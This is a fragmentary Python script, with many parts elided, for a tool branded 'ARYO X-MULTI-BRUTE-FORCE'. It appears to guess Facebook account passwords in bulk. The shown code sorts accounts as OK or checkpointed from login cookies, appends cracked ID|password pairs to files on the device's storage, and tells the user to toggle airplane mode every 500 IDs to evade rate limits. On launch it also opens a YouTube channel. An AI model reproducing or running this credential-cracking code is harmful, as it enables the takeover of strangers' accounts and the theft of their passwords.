...
def hamz_bot():
    ...
    menu()
os.system("xdg-open https://youtube.com/channel/UC0QRdEQJqxaUpn8-s59qhEA")
print("")
# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
...
•  ██║░░██║██║░╚═╝░██║██████╦╝██║░░░░░  •
• ╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░╚═╝░░░░░   •                  
               ARYO X-MULTI-BRUTE-FORCE
  File : proo'''
	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
	cetak(nel(oi, title='[bold cyan] • DEVELOVER INFORMATION • [bold blue]'))
# VALIDASI TOKEN
def login():
...
[05] GROUP MEMBERS           [00] LOGOUT[bold green]'''
...
def passwrd():
	...
	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/RMBF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/RMBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='RIAN-XD CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='Aryo-X OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]Aryo-X OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='Aryo-X CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s╰─── %s|%s ----> ChekPoint    %s'%(b,idf,pw,x))
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s╰─── %s|%s ----> ChekPoint      %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s╰─── Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
